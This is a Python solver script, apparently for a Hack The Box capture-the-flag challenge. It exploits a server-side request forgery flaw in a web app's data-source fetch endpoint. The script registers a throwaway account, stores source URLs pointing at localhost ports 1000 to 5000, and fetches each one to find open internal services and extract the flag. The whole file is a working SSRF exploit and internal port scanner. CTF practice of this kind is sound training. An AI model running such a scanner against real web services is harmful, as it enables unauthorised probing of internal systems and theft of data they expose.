#!/usr/bin/env python3
import json
import re
import secrets
import sys
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor

# The fetch endpoint requests any URL the user stores as a data source, so it can
# reach services bound to localhost. Ports that are closed return
# "Connection refused" in the fetched data, and open ports return their content.
# The solver walks ports 1000 to 5000 and prints the first flag it sees.

PORT_RANGE = range(1000, 5001)
FLAG_RE = re.compile(r"HTB\{[^}]+\}")
CLOSED_MARKERS = ("Connection refused", "Error fetching data")


def request(base, method, path, body=None, token=None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(base + path, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            return json.loads(resp.read().decode(errors="replace"))
    except urllib.error.HTTPError as err:
        raise SystemExit(f"[!] {method} {path} failed: {err.code} {err.read().decode(errors='replace')}")


def login(base):
    username = f"ctf{secrets.token_hex(4)}"
    password = secrets.token_urlsafe(12)
    request(base, "POST", "/api/auth/register", {"username": username, "password": password})
    return request(base, "POST", "/api/auth/login", {"username": username, "password": password})["access_token"]


def probe(base, token, port):
    try:
        source = request(base, "POST", "/api/data/sources", {
            "name": f"probe-{port}",
            "source_url": f"http://127.0.0.1:{port}/",
        }, token)
        fetched = request(base, "GET", f"/api/data/sources/{source['source_id']}/fetch", token=token)
    except (OSError, SystemExit):
        return port, None
    data = fetched.get("data", "")
    if any(marker in data for marker in CLOSED_MARKERS):
        return port, None
    return port, data


def main():
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} <target_ip> <target_port>", file=sys.stderr)
        sys.exit(1)

    base = f"http://{sys.argv[1]}:{sys.argv[2]}"
    token = login(base)

    with ThreadPoolExecutor(max_workers=4) as pool:
        for port, data in pool.map(lambda p: probe(base, token, p), PORT_RANGE):
            if port % 500 == 0:
                print(f"[*] Scanned up to port {port}", file=sys.stderr)
            if data is None:
                continue
            print(f"[+] Open localhost port: {port}")
            flag = FLAG_RE.search(data)
            if flag:
                print(f"[+] Flag:\n{flag.group(0)}")
                return

    print("[!] No flag found in ports 1000-5000", file=sys.stderr)
    sys.exit(1)


if __name__ == "__main__":
    main()
